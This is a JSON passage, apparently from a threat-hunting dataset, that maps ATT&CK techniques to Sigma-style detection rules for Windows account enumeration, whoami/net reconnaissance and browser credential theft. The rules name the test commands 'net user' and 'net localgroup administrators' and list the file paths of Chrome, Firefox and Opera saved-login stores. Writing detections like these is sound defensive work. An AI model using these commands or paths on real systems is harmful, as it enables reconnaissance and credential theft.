\\ System32 \\ lsass.exe' # process information> Process Name\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1069 / 1087 AD privileged group / user enumeration", "parsed_datasets": [], "queries": [{"query": "Yml\ntitle: detection of a local user group enumeration behavior\ndescription: windows server 2016\nreferences:\ntags: T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0--4798 # of enumeration local group membership of users. Test command: net user\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0--4799 # enumeration has enabled local group membership security mechanisms. Test command: net localgroup administrators\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ net1.exe' # Process information: Process Name\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: local attacker to collect information, and execute the whoami command net user command\ndescription: windows server 2012\nstatus: experimental\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: '* \\ whoami.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: whoami # process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: '* \\ net.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net user # process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: '* \\ net1.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: '* \\ net1 user' # command-line process\n\u00a0\u00a0\u00a0\u00a0condition: selection1 or (selection2 and selection3)\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1503", "parsed_datasets": [], "queries": [{"query": "Yml\ntitle: windows system web browser to obtain the voucher\ndescription: windows server 2016 test results\nreferences: No\ntags: T1503\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4663 # trying to access the object.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectserver: Security # Object> Object Server\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: file # Object> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ users \\ * \\ appdata \\ roaming \\ opera software \\ opera stable \\ login data' # Object> object name Opera\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ Users \\ IEUser \\ AppData \\ Roaming \\ Mozilla \\ Firefox \\ Profiles \\ kushu3sd.default \\ key4.db' #Firefox\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ Users \\ IEUser \\ AppData \\ Roaming \\ Mozilla \\ Firefox \\ Profiles \\ kushu3sd.default \\ logins.json' #Firefox\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ Users \\ IEUser \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data' #Chrome\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Access: ReadData (or listdirectory) # access request information> Access\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1133", "parsed_datasets": [], "queries": [], "possible_detections": [], "attack_paths": []}]}